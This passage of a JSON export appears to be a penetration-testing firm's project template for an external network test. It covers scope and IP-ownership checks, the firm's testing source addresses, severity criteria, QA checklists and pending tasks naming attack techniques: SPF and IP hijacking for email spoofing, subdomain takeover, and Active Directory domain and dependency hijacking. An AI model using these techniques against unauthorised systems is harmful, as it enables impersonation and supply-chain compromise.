                        "taskInstructions": "<h2>Instructions</h2>\nIf the client provided IP addresses are owned by the client using arin.net. If any of the IP addresses are not owned by the client, then inform the client and PM so the scope can be corrected. You can use the scripts below for quick arin lookups.  \n\n<h2><b>Variation: ipinfo</b></h2>\nNote: Limit of about 1000 per source IP every 24 hours.\n\n1. Download https://github.com/NetSPI/OSINT/tree/master/ipinfo\n2. Run the tool.\n<ncode>python ipinfo.py -f list_of_ips_one_per_line.txt -o CustomOutput.csv\n</ncode>\n<h2><b>Variation: NetblockTool</b></h2>\nNote: Limit of about 1000 per source IP every 24 hours.\n\n 1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.\n<ncode>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt\n</ncode>\n2.  Below are the subsidiary options.\n<ncode>Company Subsidiaries:\n    -s        Fetch subsidiary information and return netblocks of all subsidiaries in\n                  addition to initial target\n    -sn       Company name to use when fetching subsidiaries\n    -sp       Use alternate parsing method when fetching subsidiary information; use\n                  if the default method isn't working as expected\n    -so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)\n</ncode>\n3. Run the tool with the desired options.\n<ncode>python3 NetblockTool.py -v Company -s -sn companyname\n</ncode>\n<h2><b>Variation: Get-ArinLookup.ps1 </b></h2>\n1. Download https://github.com/NetSPI/OSINT/blob/master/Arin/Get-ArinLookup.ps1 \n2. Change the path define in the $myips variable in the source code and run the script. It will write the results to a csv and pop up a window that displays the results.\n3. Run the script in PowerShell_ISE.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Update the in Scope IPs and URLs",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41e2e02-2af0-11ee-91ee-6b683a334aa9",
                        "ordinal": 7,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Upload a list of the in scope IPs and URLs provided by the client to the Artifacts section of the project.\n2. Update this task with a reference to the file uploaded to the Artifacts section of the project.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify Contact Information",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41e0bca-2af0-11ee-91eb-6f91ed163f34",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nVerify the Communication and Escalation Procedures section has been filled out in the Kickoff Section.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify the Report Due Date",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41e1bec-2af0-11ee-91ed-9b3a349fdbc5",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nVerify the report due date has been set from the Kickoff Section.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify the Project Dates",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41dfd92-2af0-11ee-91ea-47d3b1537cdd",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b> </h2>\nVerify the project dates have been set from the Kickoff Section.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify the Project Scope",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41e1a84-2af0-11ee-91ec-57991c370e33",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nVerify the project scope has been set from the Kickoff Section. The project scope section should look similar to the following template:\n\n<b>Project Scope</b>\n<ul><li>Up to <b>n </b>IP addresses are in scope for asset discovery</li>\n<li>Up to <b>n</b> live IP addresses will be in scope for penetration testing</li>\n<li>Up to <b>n</b> custom URLs will be in scope for penetration testing</li>\n<li>Automated testing may occur 24x7 (Update as needed)</li>\n<li>Manual testing may occur 24x7 (Update as needed)</li>\n<li>All testing will be conducted from NetSPI IP Ranges defined in the kick off document</li>\n<li>IPS were put into place for NetSPIs IP ranges. <b>/</b> IPS were NOT put into place for NetSPIs IP ranges.</li>\n<li>Custom scope constraints or notes (if required)</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Confirm NetSPI IP Address Sources are Used",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41dc19c-2af0-11ee-91e8-1368552ff57c",
                        "ordinal": 10,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b> </h2>\nBelow is a list of the NetSPI IP addresses that scan monster and other activities should originate from.  If you conduct testing from other IPs, please be sure to document them here.\n\n<b>Scan network (AWS):</b>\n3.209.252.210/32; \n34.225.243.190/32 \n\n<b>Scan network (on premise): WebInspect, Nessus, Nexpose, Scan VMs</b>\nNote: On premise scanning infrastructure.\nVerizon (End of life November 2021)\n209.118.108.194\n2610:18:8bc1:319::/64\n\n<b>Main office network: Burp and local manual testing from office</b>\nVerizon (End of life November 2021)\n209.118.132.165 is the outbound gateway for the MPLS office network.\n\n<b>Remote VPN network: Burp and manual testing from home on no-split</b>\nVerizon (End of life November 2021)\n209.118.108.195\n\n<b>Virtual Networks:</b>\nVerizon (End of life November 2021)\n209.118.108.19 is the outbound gateway for all the 10.2.2.0/24 addresses.\n\n<b>Other Networks</b>\nVerizon (End of life November 2021)\n207.87.188.224/27     \n209.118.108.192/27    \n65.46.45.56/30        \n\n<b>Pentest Network Range - Explicit Mappings</b>\n<b>Note: </b>NetSPI owns the entire 76.76.14.0/24. \n76.76.14.98 /27 \n76.76.14.101 (pentest1.netspi.com) -&gt; 172.16.115.101\n76.76.14.102 (pentest2.netspi.com) -&gt; 172.16.115.102\n76.76.14.103 (pentest3.netspi.com) -&gt; 172.16.115.103\n76.76.14.104 (pentest4.netspi.com) -&gt; 172.16.115.104\n76.76.14.105 (pentest5.netspi.com) -&gt; 172.16.115.105\n76.76.14.106 (pentest6.netspi.com) -&gt; 172.16.115.106\n76.76.14.107 (pentest7.netspi.com) -&gt; 172.16.115.107\n76.76.14.108 (pentest8.netspi.com) -&gt; 172.16.115.108\n76.76.14.109 (pentest9.netspi.com) -&gt; 172.16.115.109\n76.76.14.110 (pentest10.netspi.com) -&gt; 172.16.115.110\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify Kickoff Section",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d9d34-2af0-11ee-91e4-f750b4689514",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b> </h2>\nVerify the Kickoff Section has been filled out. This should be completed by the PM.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Review previously identified entry points",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41dac0c-2af0-11ee-91e5-87a798deac70",
                        "ordinal": 12,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview previous External Penetration Test for the client and determine if previously identify entry points still exist. If so add them to the current workspace. Please be aware that you may have to request access from project management. \n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify Project Type",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41dbf80-2af0-11ee-91e7-9fba41df5637",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b> </h2>\nVerify the project type is properly set for this project. \n\n<ol><li>Click Overview.</li>\n<li>Ensure that the project type is set to &quot;External Penetration Test (ExPen:Attack)&quot;.</li>\n<li>If not, click the Project Type field and choose the &quot;External Penetration Test (ExPen:Attack)&quot; type.</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Confirm NO Akamai IPs are in scope",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41ee6e4-2af0-11ee-91f0-9fc48746c07a",
                        "ordinal": 11,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nConfirm that no Akamai IPs are used. Scanning Akamai places NetSPI IP ranges into black lists.\nPerform a whois lookup for Akamai IP ranges:\n<ncode>https://whois.arin.net/ui/query.do \n</ncode>\nYou can use the script below.\n\n<h2><b>Variation: Automated Review</b> </h2>\n1. Download  and install <a href='https://github.com/NetSPI/NetblockTool/blob/bf5a668dc52089265d9c72df3feb4dcb23ba9798/README.md'>n</a>etblock tool from  <a href='https://github.com/NetSPI/NetblockTool'>https://github.com/NetSPI/NetblockTool</a>.\n<ncode>git clone https://github.com/NetSPI/NetblockTool.git\ncd NetblockTool &amp;&amp; pip3 install -r requirements.txt\n</ncode>\n2.  Below are the subsidiary options.\n<ncode>Company Subsidiaries:\n    -s        Fetch subsidiary information and return netblocks of all subsidiaries in\n                  addition to initial target\n    -sn       Company name to use when fetching subsidiaries\n    -sp       Use alternate parsing method when fetching subsidiary information; use\n                  if the default method isn't working as expected\n    -so       Write subsidiary information to a text file (CompanyName_subsidiaries.txt)\n</ncode>\n3. Run the tool with the desired options.\n<ncode>python3 NetblockTool.py -v Company -s -sn companyname\n</ncode>\nBelow are some of the historical ranges.\n\nAKAMAI (NET6-2600-1400-1)\t        2600:1400:: - 2600:14FF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF\nAKAMAI (NET-104-64-0-0-1)\t        104.64.0.0 - 104.127.255.255\nAKAMAI (NET-172-224-0-0-1)\t        172.224.0.0 - 172.239.255.255\nAKAMAI (NET-173-222-0-0-1)\t        173.222.0.0 - 173.223.255.255\nAKAMAI (NET-184-24-0-0-1)\t        184.24.0.0 - 184.31.255.255\nAKAMAI (NET-184-50-0-0-1)\t        184.50.0.0 - 184.51.255.255\nAKAMAI (NET-184-84-0-0-1)\t        184.84.0.0 - 184.87.255.255\nAKAMAI (NET-199-233-48-0-1)\t        199.233.48.0 - 199.233.56.255\nAKAMAI (NET-204-188-136-0-3)\t204.188.136.0 - 204.188.143.255\nAKAMAI (NET-206-246-200-128-1)\t206.246.200.128 - 206.246.200.143\nAKAMAI (NET-209-170-111-0-1)\t209.170.111.0 - 209.170.111.255\nAKAMAI (NET-209-170-68-128-1)\t209.170.68.128 - 209.170.68.255\nAKAMAI (NET-209-170-76-0-1)\t        209.170.76.0 - 209.170.77.255\nAKAMAI (NET-209-170-78-128-1)\t209.170.78.128 - 209.170.78.255\nAKAMAI (NET-209-170-79-0-1)\t        209.170.79.0 - 209.170.79.127\nAKAMAI (NET-209-170-86-0-1)\t        209.170.86.0 - 209.170.87.255\nAKAMAI (NET-209-170-97-0-1)\t        209.170.97.0 - 209.170.97.255\nAKAMAI (NET-209-170-98-0-1)\t        209.170.98.0 - 209.170.98.255\nAKAMAI (NET-209-234-252-0-1)\t209.234.252.0 - 209.234.252.255\nAKAMAI (NET-209-95-131-128-1)\t209.95.131.128 - 209.95.131.255\nAKAMAI (NET-209-95-135-128-1)\t209.95.135.128 - 209.95.135.191\nAKAMAI (NET-209-95-150-192-1)\t209.95.150.192 - 209.95.150.255\nAKAMAI (NET-216-120-199-0-1)\t216.120.199.0 - 216.120.199.31\nAKAMAI (NET-23-0-0-0-1)\t                23.0.0.0 - 23.15.255.255\nAKAMAI (NET-23-192-0-0-1)\t        23.192.0.0 - 23.223.255.255\nAKAMAI (NET-23-32-0-0-1)\t                23.32.0.0 - 23.67.255.255\nAKAMAI (NET-23-72-0-0-1)\t                23.72.0.0 - 23.79.255.255\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Confirm IPS exceptions",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41dbe0e-2af0-11ee-91e6-974a8f473447",
                        "ordinal": 9,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b> </h2>\nRecord if client has confirmed the <b>IPS exceptions</b> are in place. Either way make sure the information has been updated in the <b>Project Details </b>section.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 18,
                "id": 350460,
                "name": "Project Workspace Tasks",
                "description": "This group of tasks includes things that need to be done within the project workspace in order to clean up finding prior to reporting.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Verify severity rating",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4203d82-2af0-11ee-91f5-bfbe46bae94f",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview all severities to ensure that match the severity ranking criteria.\n\n<h2>Severity Level Guidelines</h2>\nNetSPI’s vulnerability severity rating system is based on the NIST CVSS v3 scores, the Center for Information Security (CIS) Benchmarks, the Payment Card Industry Data Security Standards (PCI DSS), and internally developed criteria.    \n\n<h3><b>Critical</b></h3>\n<ncode><b>CVSS Range: </b> 7.0 - 10.0 (Exploitable) \n\n<b>Definition</b>\nVulnerabilities that were exploited to gain initial access to the targeted systems, applications, or sensitive data are labeled as entry points. This includes vulnerabilities that have been successfully exploited in the past or that provide a man-in-the-middle position.\n\nVulnerabilities that were successfully exploited during testing will be labeled as Entry Points, so they can be prioritized during remediation.  \n\nExample: Code execution, arbitrary file read/write, persistent code injection, PHI/PCI data exposure. \n</ncode>\n<h3><b>High</b></h3>\n<ncode><b>CVSS Range: </b>  7.0 - 10.0 \n\n<b>Definition</b>\nVulnerabilities with the potential to provide direct, unauthorized, remote access to protected networks, systems, application functionality, or sensitive data. However, these may not have exploitable code available, or require rare configurations to be exploitable.\n\nExample: Code execution, arbitrary file read/write, persistent code injection, PHI/PCI data exposure. \n</ncode>\n<h3><b>Medium</b></h3>\n<ncode><b>CVSS Range: </b> 4.0 - 6.9 \n\n<b>Definition</b>\nVulnerabilities that result in the exposure of session data or security configuration information. Unencrypted transmission of sensitive data, or use of weak encryption methods. This includes management, database, and file sharing interfaces that are exposed to the internet, but do not currently enforce multi-factor authentication.\n\nExample: Cross-site scripting, open SMTP relay, clear text storage of passwords/sensitive data, and cleartext management protocols such as telnet. \n</ncode>\n<h3><b>Low</b></h3>\n<ncode><b>CVSS Range: </b> 0.0 - 3.9 \n\n<b>Definition</b>\nVulnerabilities that result in the exposure version information or non-critical configuration information. Best practice configurations that help reduce attack surface and reduce the chance of the successful exploitation of other vulnerabilities.\n\nExample: Most SSL findings, RDP findings, password policy best practices, and large number of members in privileged groups.\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Rename findings to meet convention",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41ff340-2af0-11ee-91f3-93b26d8ccc84",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nFor newly findings identified by a scanning tool, create a new master findings using the naming guidelines outline at the internal site below.\n\n<a href='https://wiki.netspi.com/index.php/Report_QA#Title'>https://wiki.netspi.com/index.php/Report_QA&#35;Title</a> \n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Publish findings as they are finalized to support PTAAS",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41f64ac-2af0-11ee-91f1-eff97f589515",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Log into Resolve.\n\n2. Click workbench\n\n3. Click Projects\n\n4. Choose the target project\n\n5. Select the workspace, right-click the finding, set the state to final\n\n6. Click findings in the workspace menu\n\n7. In the upper right-hand corner of the screen click &quot;Publish All&quot;\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Submit for QA in Resolve",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4201ce4-2af0-11ee-91f4-d71931803d50",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nFollow the process defined on the wiki page below:\n<ncode>https://wiki.netspi.com/index.php/Report_QA_Tracking\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Correlate findings",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41f90e4-2af0-11ee-91f2-7bbe1afde6f1",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAfter automated scanning is complete, vulnerabilities data is exported from the tool and imported into Resolve. We then create a new manual finding that is rewritten and correlated to the automated tools plugin. Patch related findings may have correlations from multiple tools. In some cases patch related findings may also be rolled into a one of three master findings.  \n\nPlease consult with a principal security consultant the first few times you perform correlation to ensure you do it correctly.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 14,
                "id": 350461,
                "name": "Resource Hijacking [PENDING]",
                "description": "Hijacking resources such as IPs, Domains, Subdomains, or Namespace to impersonate a resource for various attacks.",
                "categoryType": "Check All Items",
                "tasks": [
                    {
                        "name": "[PENDING] IP & Domain SPF Hijacking",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4210b0e-2af0-11ee-91f9-c75b967c949c",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nLook to see if existing domains or IPs can be hijacked. This would allow us to spoof emails and generally send emails on behalf of the affected domain.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] IP Hijacking - AWS",
                        "state": 3,
                        "comments": 0,
                        "uid": "c420b366-2af0-11ee-91f7-73860d3f2495",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] Sub Domain Hijacking",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4213e44-2af0-11ee-91fb-2b9a3035fbf7",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview subdomains for potential hijacking.\n\n<h2>Variation: Manual</h2>\n1. Review enumerated domains and subdomains CNAME records.\n2. Review in-scope domains found in websites.\n3. review hosting provider configurations.\n<ncode>https://github.com/edoverflow/can-i-take-over-xyz\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] IP Hijacking - Azure",
                        "state": 3,
                        "comments": 0,
                        "uid": "c420a560-2af0-11ee-91f6-df18e99caea9",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] Active Directory Domain Hijacking",
                        "state": 3,
                        "comments": 0,
                        "uid": "c420f1a0-2af0-11ee-91f8-7b1332fca09f",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nRegister public domain for internal Active Directory domain.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[PENDING] DevOps Dependency Hijacking",
                        "state": 3,
                        "comments": 0,
                        "uid": "c4212dd2-2af0-11ee-91fa-23401d75e7a2",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nDuring recon find internal code referencing internal libraries can could potentially be hijacked by registering a module or library with the primary package management medium being used.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 19,
                "id": 350462,
                "name": "Project QA Checklist",
                "description": "Project QA Checklist",
                "categoryType": "Check All Items",
                "tasks": [
                    {
                        "name": "Report: Verify finding naming and writeups",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4222110-2af0-11ee-9205-530f6689e1eb",
                        "ordinal": 16,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify start and end dates",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4223c22-2af0-11ee-9206-af12207f7b12",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify correct client project type and template",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4218f16-2af0-11ee-9200-838ea907431f",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Update contacts and report history",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42272be-2af0-11ee-9209-2751b1e557ea",
                        "ordinal": 20,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify Scope matches SoW",
                        "state": 0,
                        "comments": 0,
                        "uid": "c422a3ec-2af0-11ee-920d-fb5f18fa4d73",
                        "ordinal": 12,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "QA Reference Links",
                        "state": 0,
                        "comments": 0,
                        "uid": "c421dcc8-2af0-11ee-9202-1b2e2094591d",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nJust mark this task as complete, but know additional references can be found below.\n\n<b>QA Tracking in Resolve</b>\nhttps://wiki.netspi.com/index.php/Report_QA_Tracking\n\n<b>Additional Links</b>\nThis quick QA checklist can be found below:\nhttps://wiki.netspi.com/index.php/Report_QA&#35;QA_Quick_Checklist\n\nThe full list of findings criteria and guidance can be found at the link below:\nhttps://wiki.netspi.com/index.php/Report_QA&#35;QA_Quick_Checklist\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify client name",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4229366-2af0-11ee-920b-935ea1de125b",
                        "ordinal": 11,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify previous project comparison",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4226486-2af0-11ee-9208-a3342c5e8623",
                        "ordinal": 9,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify headers and footers",
                        "state": 0,
                        "comments": 0,
                        "uid": "c422a1c6-2af0-11ee-920c-ebcee795a630",
                        "ordinal": 13,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify scope in Project Overview section",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4217058-2af0-11ee-91fe-03fd427eef7d",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify number of systems and vulnerabilities",
                        "state": 0,
                        "comments": 0,
                        "uid": "c421ccec-2af0-11ee-9201-bb60e82a63fe",
                        "ordinal": 14,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify all findings have been published",
                        "state": 0,
                        "comments": 0,
                        "uid": "c422d272-2af0-11ee-920f-673a0979284e",
                        "ordinal": 5,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify truncation of long URL lists",
                        "state": 0,
                        "comments": 0,
                        "uid": "c422e64a-2af0-11ee-9210-cb351405e6aa",
                        "ordinal": 17,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify finding correlation",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4225680-2af0-11ee-9207-7fb5ec5f3b2d",
                        "ordinal": 8,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify Data",
                        "state": 0,
                        "comments": 0,
                        "uid": "c4214be6-2af0-11ee-91fc-53869e1bb6be",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nVerify all data has been properly collected, uploaded, and analyzed.\n<h3>Examples:</h3>\n<ul><li>Verify ASM exports have been uploaded to Documents</li>\n<li>Verify Nmap results have been uploaded to Sources</li>\n<li>Verify domain enumeration results have been uploaded to Documents</li>\n<li>Verify ADS domain enumeration results have been uploaded to Documents</li>\n<li>Verify cloud enumeration results have been uploaded to Documents</li>\n<li>Verify employee enumeration results have been uploaded to Documents</li>\n<li>Verify Nessus, Nexpose, Burp, and Web Scraping enumeration results have been uploaded to Documents</li>\n<li>Verify Docker, GitHub, and Clipboard enumeration have been performed</li>\n<li>Verify login page, default and weak password checks, and SMTP checks have been performed</li>\n<li>Verify password guessing has been performed</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify client name",
                        "state": 0,
                        "comments": 0,
                        "uid": "c421ed08-2af0-11ee-9203-f369b0dc041c",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Spellcheck & update fields (CTRL+A F9)",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42160ae-2af0-11ee-91fd-03a305dbb3d5",
                        "ordinal": 19,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify correct client template",
                        "state": 0,
                        "comments": 0,
                        "uid": "c421fba4-2af0-11ee-9204-03f10a8932fc",
                        "ordinal": 10,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify findings technically accuracy",
                        "state": 0,
                        "comments": 0,
                        "uid": "c421807a-2af0-11ee-91ff-33ea46d59809",
                        "ordinal": 15,
                        "masterFindingId": null,
                        "taskInstructions": "Report: Verify findings technically accurate and ranked correctly, summary info accurate\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Resolve: Verify clean workspace",
                        "state": 0,
                        "comments": 0,
                        "uid": "c42280c4-2af0-11ee-920a-0fa46912f639",
                        "ordinal": 7,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Report: Verify all sensitive data is redacted",
                        "state": 0,
                        "comments": 0,
                        "uid": "c422c1ce-2af0-11ee-920e-bb7a7ed44a9d",
                        "ordinal": 18,
                        "masterFindingId": null,
                        "taskInstructions": null,
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 1,
                "id": 350463,
                "name": "Project Objectives",
                "description": "Project objectives for external network penetration tests.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "PTAAS Communication and Finding Publishing",
                        "state": 2,
                        "comments": 0,
                        "uid": "c4230260-2af0-11ee-9211-8fa2877bc4b5",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\n1. Provide a high level status update to the clients daily.\n2. Publish finding as they are completed. For consultants that are not senior or above please reach out for QA prior to publishing. \n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Obtain access to critical internal resources",
                        "state": 3,
                        "comments": 0,
                        "uid": "c423aad0-2af0-11ee-9216-3fedcd2245a0",
                        "ordinal": 5,
                        "masterFindingId": null,
